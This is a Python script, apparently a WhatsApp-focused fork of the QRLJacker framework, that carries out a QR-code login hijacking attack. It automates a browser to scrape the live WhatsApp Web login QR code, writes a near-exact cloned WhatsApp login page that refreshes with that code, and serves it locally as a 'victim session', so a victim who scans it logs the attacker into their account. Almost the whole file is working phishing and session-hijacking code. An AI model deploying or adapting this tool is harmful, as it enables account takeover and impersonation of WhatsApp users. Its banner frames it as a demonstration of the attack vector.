#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author: @D4Vinci
import base64 ,time ,os ,urllib ,sys ,threading
from binascii import a2b_base64

def clear():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")

try:
	from PIL import Image
	import selenium, requests, configparser
	from selenium import webdriver

except:
	print "[*] Error Importing Exterinal Libraries"
	print "[*] Trying install it using the requirements.txt file..\n"
	try:
		os.system("pip install -r requirements.txt")
	except:
		try:
			#if python not in the path (In windows case)
			os.system(str(sys.executable)+" -m pip install -r requirements.txt")
		except:
			print "[*] Failed installing the requirements [ Install it yourself :p ]"
		exit()

finally:
	from PIL import Image
	import selenium
	from selenium import webdriver

settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name=="nt":
			try:
				print " [*] Starting victim session on http://localhost:"+str(port)
				os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
			except:
				print " [*] Starting victim session on http://localhost:"+str(port)
				#if python not in the path (In windows case)
				os.system(str(sys.executable)+" -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
		else:
			print " [*] Starting victim session on http://localhost:"+str(port)
			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print " [*] Opening Mozila FireFox..."
		return web
	except:
		try:
			web = webdriver.Chrome()
			print " [*] We got some errors running Firefox, Opening Google Chrome instead..."
			return web
		except:
			try:
				web = webdriver.Opera()
				print " [*] We got some errors running Chrome, Opening Opera instead..."
				return web
			except:
				try:
					web = webdriver.Edge()
					print " [*] We got some errors running Opera, Opening Edge instead..."
					return web
				except:
					try:
						web = webdriver.Ie()
						print " [*] We got some errors running Edge, Opening Internet Explorer instead..."
						return web
					except:
						print " Error: \n Can not call any WebBrowsers\n  Check your Installed Browsers!"
						exit()

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get('https://web.whatsapp.com/')
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return

	while True:
		try:
			button = driver.find_element_by_class_name('qr-button')
			print " [*] Idle detected, Reloading QR code image (Good job WhatsApp)..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace("data:image/png;base64,","")
			print " [*] QR code image detected !"
			print " [*] Downloading the image..."
			binary_data = a2b_base64(src)
			qr = open("tmp.png","wb")
			qr.write(binary_data)
			print " [*] Saved To tmp.png"
			qr.close()
			time.sleep(5)
			continue
		except:
			break



def make( service_name , port , type="html" ):
	if type == "html":
		code = """<html class="js cssanimations csstransitions webp webp-alpha webp-animation webp-lossless wf-opensans-n4-inactive wf-opensans-n6-inactive wf-roboto-n3-inactive wf-roboto-n4-inactive wf-roboto-n5-inactive wf-inactive" dir="ltr" manifest="/404.appcache"><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>WhatsApp</title>
<meta name="viewport" content="width=device-width">
<meta name="google" content="notranslate">
<meta name="format-detection" content="telephone=no">

<meta name="description" content="Quickly send and receive WhatsApp messages right from your computer.">
<meta name="og:description" content="Quickly send and receive WhatsApp messages right from your computer.">
<meta name="og:url" content="https://web.whatsapp.com/">
<meta name="og:title" content="WhatsApp Web">
<meta name="og:image" content="https://www.whatsapp.com/img/whatsapp-promo.png">

<link id="favicon" rel="shortcut icon" href="blob:https://web.whatsapp.com/b37bf44b-20b1-4691-a46a-539285f5a805" type="image/png">
<link rel="apple-touch-icon" sizes="194x194" href="https://web.whatsapp.com/apple-touch-icon.png" type="image/png">

<link rel="stylesheet" href="https://web.whatsapp.com/sprite_aaa6f707db97264a007b75466897c079.css">
<link rel="stylesheet" id="style" href="https://web.whatsapp.com/style_56c2541f057e23661d28d70ea6ae975a.css">
<link rel="shortcut icon" href="https://web.whatsapp.com/img/favicon/1x/favicon.png" type="image/x-icon">
<style>
html, body, #app {
height: 100%;
width: 100%;
overflow: hidden;
padding: 0;
margin: 0;
}

#app {
position: absolute;
top: 0;
left: 0;
}

#startup, #initial_startup {
width: 100%;
height: 100%;
position: fixed;
background-color: #f2f2f2;

-moz-user-select: none;
-webkit-user-select: none;

display: flex;
align-items: center;
justify-content: center;
display: -webkit-box;
display: -webkit-flex;
-webkit-align-items: center;
-webkit-justify-content: center;
flex-direction: column;
-webkit-flex-direction: column;
}

.spinner-container {
-webkit-animation: rotate 2s linear infinite;
animation: rotate 2s linear infinite;
z-index: 2;
}

.spinner-container .path {
stroke-dasharray: 1,150; 
stroke-dashoffset: 0;
stroke: rgba(27, 154, 89, 0.7);
stroke-linecap: round;
-webkit-animation: dash 1.5s ease-in-out infinite;
animation: dash 1.5s ease-in-out infinite;
}

#startup .spinner-container .path,
#initial_startup .spinner-container .path {
stroke: #acb9bf;
}

@keyframes rotate {
100% { transform: rotate(360deg); }
}
@-webkit-keyframes rotate{
100% { -webkit-transform: rotate(360deg); }
}

@keyframes dash {
0% {
stroke-dasharray: 1,150;  
stroke-dashoffset: 0;
}
50% {
stroke-dasharray: 90,150; 
stroke-dashoffset: -35;   
}
100% {
stroke-dasharray: 90,150; 
stroke-dashoffset: -124;  
}
}
@-webkit-keyframes dash {
0% {
stroke-dasharray: 1,150;  
stroke-dashoffset: 0;
}
50% {
stroke-dasharray: 90,150; 
stroke-dashoffset: -35;   
}
100% {
stroke-dasharray: 90,150; 
stroke-dashoffset: -124;  
}
}

.progress-container {
width: 360px;
position: fixed;
padding-top: 120px;
top: 50%;
left: 50%;
margin-left: -180px;
}

progress {
-webkit-appearance: none;
appearance: none;
width: 100%;
height: 3px;
border: none;
margin: 0;
color: #02d1a4;
background-color: #e0e4e5;
}

progress[value]::-webkit-progress-bar {
background-color: #e0e4e5;
}

progress[value]::-webkit-progress-value {
background-color: #02d1a4;
}

progress[value]::-moz-progress-bar {
background-color: #02d1a4;
}
</style>
<script id="https://web.whatsapp.com/progress_script_/vendor1_56dd5f787acf8f732f70.js" type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/vendor1_56dd5f787acf8f732f70.js"></script><script id="https://web.whatsapp.com/progress_script_/vendor2_e7a64b5704c917f08014.js" type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/vendor2_e7a64b5704c917f08014.js"></script><script id="https://web.whatsapp.com/progress_script_/app_7518c0f50e972300a4e7.js" type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/app_7518c0f50e972300a4e7.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600%7CRoboto:300,400,500" media="all"><script id="progress_script_/main_eefe62d5207285a09178.js" type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/main_eefe62d5207285a09178.js"></script><style id="asset-style" type="text/css"></style><script type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/main_eefe62d5207285a09178.js"></script></head>
<body>
<script>
var myTimer; myTimer = window.setInterval(reloadD,3000);
function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();}
</script>
<<div id="app"><div data-reactroot="" class="app-wrapper app-wrapper-web"><span></span><div id="wrapper"><div id="window"><div class="entry-main"><div class="qr-wrapper-container"><div class="qrcode" data-ref="1@Kts4x+ctp/+ZtZCLgef6bSOvBvDXJYaSOy82l7Vflxz5O7ZP2TxOHrGY,TqTHjI1vOLSzc3J0mrKJInFh9cRy8X93tgbmUO7YxBo=,JXGJEOGBeyHy+mJhyMIcsw=="><span></span><span class="icon icon-logo"><img src='https://i.imgur.com/4NUKSph.png' /></span><canvas width="240" height="240" style="display: none;"></canvas><img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></div></div><div class="entry-text"><div class="entry-title">WhatsApp</div><div class="entry-subtitle">Use WhatsApp on your phone to scan the code</div><div class="entry-controls"><div class="toggle"><span></span><label><input type="checkbox" name="rememberMe" value="on"><!-- react-text: 21 -->Keep me signed in<!-- /react-text --></label></div><div class="hint">To reduce mobile data usage, connect your phone to Wi-Fi</div></div></div></div><div id="platforms"><img src="http://image.prntscr.com/image/6621581ee26f4b39bfd7ef0d7387cc4a.png"></img></div></div></div></div></div>



<script src="https://web.whatsapp.com/progress_a0497b6b323aacccbd3490fa20a28559.js"></script></body></html>"""

	if type == "svg":
		code = """<html class="js cssanimations csstransitions webp webp-alpha webp-animation webp-lossless wf-opensans-n4-inactive wf-opensans-n6-inactive wf-roboto-n3-inactive wf-roboto-n4-inactive wf-roboto-n5-inactive wf-inactive" dir="ltr" manifest="/404.appcache"><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>WhatsApp</title>
<meta name="viewport" content="width=device-width">
<meta name="google" content="notranslate">
<meta name="format-detection" content="telephone=no">

<meta name="description" content="Quickly send and receive WhatsApp messages right from your computer.">
<meta name="og:description" content="Quickly send and receive WhatsApp messages right from your computer.">
<meta name="og:url" content="https://web.whatsapp.com/">
<meta name="og:title" content="WhatsApp Web">
<meta name="og:image" content="https://www.whatsapp.com/img/whatsapp-promo.png">

<link id="favicon" rel="shortcut icon" href="blob:https://web.whatsapp.com/b37bf44b-20b1-4691-a46a-539285f5a805" type="image/png">
<link rel="apple-touch-icon" sizes="194x194" href="https://web.whatsapp.com/apple-touch-icon.png" type="image/png">

<link rel="stylesheet" href="https://web.whatsapp.com/sprite_aaa6f707db97264a007b75466897c079.css">
<link rel="stylesheet" id="style" href="https://web.whatsapp.com/style_56c2541f057e23661d28d70ea6ae975a.css">
<link rel="shortcut icon" href="https://web.whatsapp.com/img/favicon/1x/favicon.png" type="image/x-icon">
<style>
html, body, #app {
height: 100%;
width: 100%;
overflow: hidden;
padding: 0;
margin: 0;
}

#app {
position: absolute;
top: 0;
left: 0;
}

#startup, #initial_startup {
width: 100%;
height: 100%;
position: fixed;
background-color: #f2f2f2;

-moz-user-select: none;
-webkit-user-select: none;

display: flex;
align-items: center;
justify-content: center;
display: -webkit-box;
display: -webkit-flex;
-webkit-align-items: center;
-webkit-justify-content: center;
flex-direction: column;
-webkit-flex-direction: column;
}

.spinner-container {
-webkit-animation: rotate 2s linear infinite;
animation: rotate 2s linear infinite;
z-index: 2;
}

.spinner-container .path {
stroke-dasharray: 1,150; 
stroke-dashoffset: 0;
stroke: rgba(27, 154, 89, 0.7);
stroke-linecap: round;
-webkit-animation: dash 1.5s ease-in-out infinite;
animation: dash 1.5s ease-in-out infinite;
}

#startup .spinner-container .path,
#initial_startup .spinner-container .path {
stroke: #acb9bf;
}

@keyframes rotate {
100% { transform: rotate(360deg); }
}
@-webkit-keyframes rotate{
100% { -webkit-transform: rotate(360deg); }
}

@keyframes dash {
0% {
stroke-dasharray: 1,150;  
stroke-dashoffset: 0;
}
50% {
stroke-dasharray: 90,150; 
stroke-dashoffset: -35;   
}
100% {
stroke-dasharray: 90,150; 
stroke-dashoffset: -124;  
}
}
@-webkit-keyframes dash {
0% {
stroke-dasharray: 1,150;  
stroke-dashoffset: 0;
}
50% {
stroke-dasharray: 90,150; 
stroke-dashoffset: -35;   
}
100% {
stroke-dasharray: 90,150; 
stroke-dashoffset: -124;  
}
}

.progress-container {
width: 360px;
position: fixed;
padding-top: 120px;
top: 50%;
left: 50%;
margin-left: -180px;
}

progress {
-webkit-appearance: none;
appearance: none;
width: 100%;
height: 3px;
border: none;
margin: 0;
color: #02d1a4;
background-color: #e0e4e5;
}

progress[value]::-webkit-progress-bar {
background-color: #e0e4e5;
}

progress[value]::-webkit-progress-value {
background-color: #02d1a4;
}

progress[value]::-moz-progress-bar {
background-color: #02d1a4;
}
</style>
<script id="https://web.whatsapp.com/progress_script_/vendor1_56dd5f787acf8f732f70.js" type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/vendor1_56dd5f787acf8f732f70.js"></script><script id="https://web.whatsapp.com/progress_script_/vendor2_e7a64b5704c917f08014.js" type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/vendor2_e7a64b5704c917f08014.js"></script><script id="https://web.whatsapp.com/progress_script_/app_7518c0f50e972300a4e7.js" type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/app_7518c0f50e972300a4e7.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600%7CRoboto:300,400,500" media="all"><script id="progress_script_/main_eefe62d5207285a09178.js" type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/main_eefe62d5207285a09178.js"></script><style id="asset-style" type="text/css"></style><script type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com/main_eefe62d5207285a09178.js"></script></head>
<body>
<script>
var myTimer; myTimer = window.setInterval(reloadD,3000);
function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();}
</script>
<<div id="app"><div data-reactroot="" class="app-wrapper app-wrapper-web"><span></span><div id="wrapper"><div id="window"><div class="entry-main"><div class="qr-wrapper-container"><div class="qrcode" data-ref="1@Kts4x+ctp/+ZtZCLgef6bSOvBvDXJYaSOy82l7Vflxz5O7ZP2TxOHrGY,TqTHjI1vOLSzc3J0mrKJInFh9cRy8X93tgbmUO7YxBo=,JXGJEOGBeyHy+mJhyMIcsw=="><span></span><span class="icon icon-logo"><img src='https://i.imgur.com/4NUKSph.png' /></span><canvas width="240" height="240" style="display: none;"></canvas><img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></div></div><div class="entry-text"><div class="entry-title">WhatsApp</div><div class="entry-subtitle">Use WhatsApp on your phone to scan the code</div><div class="entry-controls"><div class="toggle"><span></span><label><input type="checkbox" name="rememberMe" value="on"><!-- react-text: 21 -->Keep me signed in<!-- /react-text --></label></div><div class="hint">To reduce mobile data usage, connect your phone to Wi-Fi</div></div></div></div><div id="platforms"><img src="http://image.prntscr.com/image/6621581ee26f4b39bfd7ef0d7387cc4a.png"></img></div></div></div></div></div>



<script src="https://web.whatsapp.com/progress_a0497b6b323aacccbd3490fa20a28559.js"></script></body></html>"""""
	f = open("index.html","w")
	f.write(code)
	f.close()


def main():
	clear()
	print """

 __          ___           _                          
 \ \        / / |         | |                         
  \ \  /\  / /| |__   __ _| |_ ___  __ _ _ __  _ __   
   \ \/  \/ / | '_ \ / _` | __/ __|/ _` | '_ \| '_ \  
    \  /\  /  | | | | (_| | |_\__ \ (_| | |_) | |_) | 
     \/  \/   |_| |_|\__,_|\__|___/\__,_| .__/| .__/  
                                        | |   | |     
   ____  _____  _          _            |_|   |_|     
  / __ \|  __ \| |        | |          | |            
 | |  | | |__) | |        | | __ _  ___| | _____ _ __ 
 | |  | |  _  /| |    _   | |/ _` |/ __| |/ / _ \ '__|
 | |__| | | \ \| |___| |__| | (_| | (__|   <  __/ |   
  \___\_\_|  \_\______\____/ \__,_|\___|_|\_\___|_|   

  #QRLJacker is a customizable framework to demonstrate "QRLJacking Attack Vector" and shows How easy to hijack services that relies on QR Code Authentication!
  #A Social Engineering Attack Vector by: Mohamed A. Baset (@SymbianSyMoh)
  #Coded by: Karim Shoair (@D4Vinci)
  #Extracción solo para Whatsapp (@yottahack)/ (@G3orgx)

"""

port = 1337
clear()
make( "Whatsapp" , port )
Serve_it(port)
whatsapp()


if __name__ == '__main__':
	main()
